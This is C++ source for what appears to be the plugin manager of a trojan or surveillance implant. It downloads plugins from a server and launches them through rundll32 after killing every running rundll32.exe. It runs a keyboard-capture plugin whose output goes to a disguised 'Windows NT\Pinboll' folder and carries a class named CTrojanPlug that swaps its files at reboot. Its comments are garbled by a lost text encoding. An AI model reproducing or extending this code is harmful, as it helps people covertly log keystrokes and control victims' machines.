/**
* Copyright(C)2013,RUN  All rights reserved.
* @file
* @brief �����Ϣ���ʵ���ļ�
* @author ����ΰ chengwei@run.com
* @date 2013-07-30
* @version 1.0
* @note 
*************************************************************************/

#include "ddc_util.h"
#include "PluginServerInfo.h"
#include "UpdateManager.h"
#include "Log.h"
#include "MD5.h"
#include "TSPPlug.h"
#include "../until.h"



// ����
CPlugServerInfo::CPlugServerInfo()
	:m_dwSize(-1),m_status(STATUS_INIT),m_dwFlag(0)
{
	m_md5[0] = 0;
	m_ver[0] = 0;
}

// ����
CPlugServerInfo::~CPlugServerInfo()
{
	UnLoadPlug(0);
}

// ���ز��
int CPlugServerInfo::LoadPlug( DWORD dwFlag )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::LoadPlug(%d) \n",dwFlag));

	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// ���������Ҳ����ֹͣ�����У���ֹ���δ���ӷ�����״̬��ͣ�ص���
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);

	// ����״̬
	DDC_BOOL_RETURN( m_status==STATUS_INIT,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_ERROR,DDCE_STATUS_ERROR);
	DDC_BOOL_RETURN( m_status==STATUS_WAITDOWNLOAD,DDCE_STATUS_ERROR);
	

	LOG((LEVEL_INFO,"m_status = %u \n",m_status));

	int ret = LoadPlug_i(dwFlag);

	//��״̬
	m_status = STATUS_LOAD;
	return 0;
}

// ж�ز������ɾ����
int CPlugServerInfo::UnLoadPlug( DWORD dwFlag )
{	
	if( m_status != STATUS_INIT && m_status != STATUS_DOWNLOAD   )
		LOG((LEVEL_INFO,"CPlugServerInfo::UnLoadPlug(%d),%s \n",dwFlag,m_strRealName.c_str()));

	DDC_BOOL_RETURN( m_status==STATUS_UNLOAD,0);

	// ��������У���ֹͣ
	if( m_status == STATUS_RUNNING )
		StopPlug(0);

	// ж��
	if( m_status == STATUS_LOAD )
	{	
		int ret = UnLoadPlug_i(dwFlag);

		//��״̬
		m_status = STATUS_UNLOAD;
	}
	else
		NULL;			//�������ж�һ��״̬����������ʱж�ػ�������Ӧ�ã�����״̬Ҫ��


	return 0;
}

// �������
int CPlugServerInfo::StartPlug( PLUGPARAM *param )
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::StartPlug(%x) %s \n",param,m_strRealName.c_str()));
	
	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_RUNNING,0);

	// �ȼ���
	if( m_status == STATUS_UNLOAD )
		LoadPlug(0);

	// ����start()����
	if( m_status == STATUS_LOAD )
	{
		int ret = StartPlug_i(param);
		m_status = STATUS_RUNNING;
		return 0;
	}

	return DDCE_STATUS_ERROR;
}

// ֹͣ���
int CPlugServerInfo::StopPlug( DWORD dwFlag )
{	
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::StopPlug %s \n",m_strRealName.c_str()));
	// ��ǰ״̬
	DDC_BOOL_RETURN( m_status==STATUS_LOAD,0);

	// ����stop
	if( m_status == STATUS_RUNNING )
	{
		int ret = StopPlug_i(dwFlag);
		m_status = STATUS_LOAD;
	}
	else
	{
		LOG((LEVEL_WARNNING,"���״̬����ȷ.%d",m_status));		
	}

	return 0;
}


// ���ж��
int CPlugServerInfo::RemovePlug( DWORD dwFlag)
{
	LOG((LEVEL_FUNC_IN_OUT,"CPlugServerInfo::RemovePlug(%d)\n",dwFlag));

	// ���������ɾ���������������
	if( dwFlag != 0 )
		return RemovePlug_i(dwFlag);

	DDC_BOOL_RETURN( m_status == STATUS_DELETE,0);

	// ��ʼ����״̬��ɾ���󷵻�ɾ��״̬�������ܽ�����ȥ
	if( m_status == STATUS_INIT )
	{
		m_status = STATUS_DELETE;
		return 0;
	}

	// ��ж��
	int ret = UnLoadPlug(dwFlag);
	
	ret = RemovePlug_i(dwFlag);

	// ɾ�����
	if( !DeleteFile(m_strFullName.c_str()) )
	{
		LOG((LEVEL_ERROR,"ɾ�����ʧ��(%s):%d \n",m_strFullName.c_str(),GetLastError()));
		MoveFileEx(m_strFullName.c_str(),NULL,MOVEFILE_DELAY_UNTIL_REBOOT);

		m_status = STATUS_DELETE;	
	}


	m_status = STATUS_DELETE;	

	return 0;
}


// ����
int CPlugServerInfo::UpdatePlug( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param )
{
	// ֱ��ת��
	return UpdatePlug_i(dwFlag,strConfigFile,param);	
}

// ���ز��
int CPlugServerInfo::DownloadPlug( std::string strPluginDownLoadPath )
{
	int ret = 0;

	// ״̬Ϊ�ȴ����صĲ���
	if( m_status == STATUS_WAITDOWNLOAD )
	{
		LOG((LEVEL_INFO,"CPlugServerInfo::DownloadPlug:%s \n",m_strName.c_str() ));

		std::string strName(strPluginDownLoadPath);
		strName += m_strName;
		ret = CUpdateManager::GetFileFromServerImp(m_strURL.c_str(),strName.c_str(),m_dwSize );
		if( ret != 0 )
		{
			LOG((LEVEL_WARNNING,"GetFileFromServ error,return:%d\n",ret));
			
		}

		// ����md5
		char md5[TSP_PLUGIN_SHORT_PATH];
		memset(&md5,0,TSP_PLUGIN_SHORT_PATH);
		if( !MD5_Caculate_File ( const_cast<char *>(strName.c_str()),md5) )
		{
			LOG((LEVEL_ERROR,"����md5(%s)ʧ��\n",strName.c_str()));
			ret = DDCE_CALL_FAIL;
		}

		if( strncmp(md5,m_md5,32) != 0 )
		{
			LOG((LEVEL_ERROR,"md5��ƥ��(%s,%s)ʧ��\n",strName.c_str(),m_md5));
#if !defined(_DEBUG)
			ret = DDCE_NOT_MATCH;
#endif
		}

		// ��״̬
		if(ret)
			m_status = CPlugServerInfo::STATUS_ERROR;
		else
			m_status = CPlugServerInfo::STATUS_DOWNLOAD;
	}

	return ret;
}

// ��ʼ��
void CPlugServerInfo::reset(void)
{
	m_strName = "";
	m_strFullName = "";
	m_md5[0] = 0;
	m_ver[0] = 0;
	m_strURL = "";
	m_dwSize = 0;
	m_dwFlag = 0;
	m_pid = 0;
	m_status = STATUS_INIT;
	m_hnd = NULL;
}

// ��ֵ
CPlugServerInfo& CPlugServerInfo::operator=(const CPlugServerInfo &other)
{
	m_strName = other.m_strName;
	m_strFullName = other.m_strFullName;
	memcpy(m_md5,other.m_md5,TSP_PLUGIN_SHORT_PATH);
	memcpy(m_ver,other.m_ver,TSP_PLUGIN_SHORT_PATH);
	m_strURL = other.m_strURL;
	m_dwSize = other.m_dwSize;
	m_dwFlag = other.m_dwFlag;
	m_status = other.m_status;
	m_hnd = other.m_hnd;
	m_pid = other.m_pid;
	m_strRoot = other.m_strRoot;
	m_strDir = other.m_strDir;
	m_strRealName = other.m_strRealName;

	return *this;
}


/////////////////////////////////////////////////////
CManagePlug::CManagePlug()
	:CPlugServerInfo()
{
	// �����ڴ��ʼ��
	m_mem.Create(TSP_PLUG_COMM_SIGN,4096);
	m_dwProcessID = -1;
};


int CManagePlug::RemovePlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CManagePlug::RemovePlug_i(%d)\n",dwFlag));

	if(dwFlag == 0 )
	{
		// ɾ���Լ��������ļ�
		string str(m_strFullName);
		int pos = str.rfind('\\');	
		if( pos != str.npos )
		{
			str.erase(pos+1);
			str += "cfgm.ini";					// ���ļ��������� ../../TSPPlug/PluginManager.h��
			if( ::DeleteFile(str.c_str()) == 0 )
			{ 
				LOG((LEVEL_WARNNING,"ɾ�������ļ�ʧ��:(%s),lasterror=%d\n",str.c_str(),GetLastError()));
			}
		}
	}
	else if( dwFlag == UPDATE_DLL )
	{
		// ֪ͨTSPPlugж��
		PLUG_COMM_ST header;	
		header.reset();
		header.cmd = PLUG_COMM_ST::REMOVE;
		header.pid = m_dwProcessID;
		m_mem.Write(&header,sizeof(PLUG_COMM_ST));
	}
	
	return 0;
}

int CManagePlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *param)
{
	switch( dwFlag )
	{
	case UPDATE_CFG:		// ����ʱ�ƶ��˵ط������������ļ����µط�
		{			
			// ��Ӧ����ͬ�������ͬ���ⲿ���þʹ���
			if( strConfigFile == m_strFullName )
				return 0;

			// ��ƴװ�����������ļ�����
			string strS(m_strFullName),strD(strConfigFile);
			int pos = strS.rfind('\\');	
			if( pos != strS.npos )
			{
				strS.erase(pos+1);
				strS += "cfgm.ini";
			}
			
			pos = strD.rfind('\\');	
			if( pos != strD.npos )
			{
				strD.erase(pos+1);
				strD += "cfgm.ini";
			}

			
		 if( 0 == CopyFile(strS.c_str(),strD.c_str(),false ))
				LOG((LEVEL_WARNNING,"CopyFile(%s==>%s) error,lasterror=%d\n",strS.c_str(),strD.c_str(),GetLastError()));
		}
		break;
	case UPDATE_DLL:
		{
			// �ȷ���echo,���û����Ӧ����������
			PLUG_COMM_ST header;
			header.reset();			
			header.cmd = PLUG_COMM_ST::ECHO;
			header.len = 0;
			header.pid = m_dwProcessID;
			m_mem.Write(&header,sizeof(PLUG_COMM_ST));	

			Sleep(1000);
			PLUG_COMM_ST *pheader = (PLUG_COMM_ST *)m_mem.GetBuffer();	
			if( pheader->request != (BYTE)PLUG_COMM_ST::REPLY )
			{
				m_status = STATUS_UNLOAD;
				StartPlug(param);
			}
			


			// ��������
			header.reset();
			header.cmd = PLUG_COMM_ST::UPDATE;
			header.pid = m_dwProcessID;
			header.len = strConfigFile.length()+1;
			char *buff;			
			DDC_NEW_RETURN(buff,char[header.len + sizeof(PLUG_COMM_ST)+1],DDCE_MEMORY_ALLOC_ERROR);
			memcpy(buff,&header,sizeof(PLUG_COMM_ST));
			memcpy(buff+sizeof(PLUG_COMM_ST),strConfigFile.c_str(),header.len);
			buff[sizeof(PLUG_COMM_ST)+header.len] = 0;

			m_mem.Write(buff,header.len+sizeof(PLUG_COMM_ST)+1);

			DDC_DELETE(buff);
			Sleep(500);			
		}
		break;
	case 0:
		break;
	default:
		return DDCE_UNSUPPORT;
	}
	return 0;
}

int CManagePlug::LoadPlug_i( DWORD dwFlag )
{	
	
	
	if( _access(m_strFullName.c_str(),0) == -1)
	{
		m_status = STATUS_DELETE;
		LOG((LEVEL_ERROR,"û�ҵ��ļ� %s.\n",m_strFullName.c_str() ));
		return -1;
	}


	KillProcess("rundll32.exe");


	
	LOG((LEVEL_INFO,"CManagePlug::LoadPlug_i()\n"));


	// ����ж��,�����δ�����Ľ��̣�֪ͨ�����Լ�����

	/*  ע�͵�by menglz

	PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::QUIT;
	header.pid = -1;
	m_mem.Write(&header,sizeof(PLUG_COMM_ST));

	*/

	ostringstream os;	
	os<<"rundll32 \""<<m_strFullName<<"\",start";

	// CreateProcess
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	memset(&si,0,sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	
	int ret = CreateProcess(NULL,(LPSTR)os.str().c_str(),NULL,NULL,0,0,NULL,NULL,&si,&pi);
	if( ret == 0 )
	{
		LOG((LEVEL_ERROR,"CreateProcess failed.(%s)\n",os.str().c_str()));
		return DDCE_CALL_FAIL;
	}
	m_dwProcessID = pi.dwProcessId;
	return 0;
}
int CManagePlug::UnLoadPlug_i( DWORD dwFlag )
{
	LOG((LEVEL_INFO,"CManagePlug::UnLoadPlug_i()\n"));

	// ����ж��
	PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::QUIT;
	header.pid = m_dwProcessID;
	m_mem.Write(&header,sizeof(PLUG_COMM_ST));
	Sleep(500);
	return 0;
}

int CManagePlug::StartPlug_i( PLUGPARAM *param )
{
	LOG((LEVEL_INFO,"CManagePlug::StartPlug_i()\n"));
	
	// ��������
	char buff[sizeof(PLUG_COMM_ST)+sizeof(PLUGPARAM)+1] = {0};
		PLUG_COMM_ST header;
	header.reset();
	header.cmd = PLUG_COMM_ST::START;
	header.pid = m_dwProcessID;
	header.len = sizeof(PLUGPARAM);
	memcpy(buff,&header,sizeof(PLUG_COMM_ST));
	memcpy(buff+sizeof(PLUG_COMM_ST),param,sizeof(PLUGPARAM));
	m_mem.Write(buff,sizeof(PLUG_COMM_ST)+sizeof(PLUGPARAM));
	
	Sleep(500);
	return 0;
}
int CManagePlug::StopPlug_i( DWORD dwFlag )
{
	LOG((LEVEL_INFO,"CManagePlug::StopPlug_i()\n"));
	
	// ����ֹͣ
	PLUG_COMM_ST header;	
	header.reset();
	header.cmd = PLUG_COMM_ST::STOP;
	header.pid = m_dwProcessID;
	m_mem.Write(&header, sizeof(PLUG_COMM_ST));
	Sleep(500);
	return 0;
}
/////////////////////////////////////////////////////////////////
CKeyBoardPlug::CKeyBoardPlug()
	:CPlugServerInfo()
{
}
int CKeyBoardPlug::StartPlug_i( PLUGPARAM *param )
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::StartPlug_i()\n"));	
	
	std::string str(m_strFullName);
	str += ".BAK";

	// ���̲�����⣬���ܷ���ֵ
	if( ::CopyFile(m_strFullName.c_str(),str.c_str(),false ) == 0)
		LOG((LEVEL_WARNNING,"CopyFile(%s==>%s) error,lasterror=%d\n",m_strFullName.c_str(),str.c_str(),GetLastError()));

	if( param->imp.chResultPath[0] == 0 )  //�����ò��������·��ʧ�ܣ�����Ĭ��·��
	{
		LOG((LEVEL_INFO,"CKeyBoardPlug::StartPlug(%s)\n",param->imp.chResultPath));
		char szDefaultPath[260] =  {0};
		


		SHGetSpecialFolderPathA(NULL,szDefaultPath,CSIDL_PROGRAM_FILES ,FALSE);

		strncat(szDefaultPath,"\\Windows NT\\Pinboll\\",MAX_PATH-15);



		strncpy(param->imp.chResultPath,szDefaultPath,260);
	}

	
#ifdef _CPPUNIT
	return 0;		// test class
#else
	return m_KeyBoarkPlugin.Start(str.c_str(),param->imp.chResultPath);	
#endif
}

int CKeyBoardPlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *)
{
	DDC_BOOL_RETURN( dwFlag !=0,0);

	// ���������ļ������أ�������".BAK"
	string str(m_strFullName);
	str += ".BAK";
	CopyFile(strConfigFile.c_str(),str.c_str(),false);

	if( m_status == STATUS_INIT || m_status == STATUS_ERROR )
	{
		m_status = STATUS_UNLOAD;
	}
	else
		// �϶��滻������д��MoveFileEx
		MoveFileEx(str.c_str(),m_strFullName.c_str(),MOVEFILE_DELAY_UNTIL_REBOOT);
	return 0;
}


int CKeyBoardPlug::RemovePlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::RemovePlug_i()\n"));
	
	// ɾ�����̲��
	std::string str(m_strFullName);
	str += ".BAK";
	if( ::DeleteFile(str.c_str()) == 0 )
	{
		LOG((LEVEL_WARNNING,"DeleteFile(%s) error,lasterror=%d\n",str.c_str(),GetLastError()));
	}
	return 0;
}

int CKeyBoardPlug::StopPlug_i(DWORD dwFlag)
{
	LOG((LEVEL_INFO,"CKeyBoardPlug::StopPlug_i()\n"));
	
	// ���̲�����⴦��
	int ret = m_KeyBoarkPlugin.Stop();
	//ret = 0;
	if( ret != 0 )
	{
		LOG((LEVEL_ERROR,"KeyBoarkPlugin.Stop() return :%d(%x)\n",ret,ret));
		m_status = STATUS_RUNNING;
	}	
	return 0;
}

////////////////////////////////////////////

// ľ����������
int CTrojanPlug::UpdatePlug_i( DWORD dwFlag,const string &strConfigFile,PLUGPARAM *)
{	
	DDC_BOOL_RETURN( dwFlag !=0,0);

	// ���������ļ������أ�������".BAK"
	string str(m_strFullName);
	str += ".BAK";
	CopyFile(strConfigFile.c_str(),str.c_str(),false);

	// �϶��滻������д��MoveFileEx
	MoveFileEx(str.c_str(),m_strFullName.c_str(),MOVEFILE_DELAY_UNTIL_REBOOT);

	return 0;
}